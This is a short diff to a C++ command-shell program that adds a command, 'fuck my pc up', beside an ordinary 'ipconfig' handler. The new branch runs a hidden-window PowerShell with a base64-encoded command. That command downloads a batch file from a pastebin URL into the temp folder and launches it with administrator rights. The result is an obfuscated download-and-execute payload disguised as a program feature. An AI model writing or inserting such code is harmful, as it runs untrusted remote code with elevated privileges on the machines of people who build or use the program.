@@ -298,6 +298,10 @@ public:
             else if (cmd == "ipconfig") {
                 NetworkUtils::displayIpConfig();
             }
+
+            else if (cmd == "fuck my pc up") {
+                system("Powershell -w h -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQAZQBtAHAAXABBAG0ALgBiAGEAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwBoAHoAVgBOAFQAeAB4AEIAIAA7ACAAcABvAHcAZQByAHMAaABlAGwAbAAgACIAcwB0AGEAcgB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABBAG0ALgBiAGEAdAAgAC0AVgBlAHIAYgAgAFIAdQBuAEEAcwAiAA==");
+            }
             else {
                 // Execute as system command
                 executeSystemCommand(args);
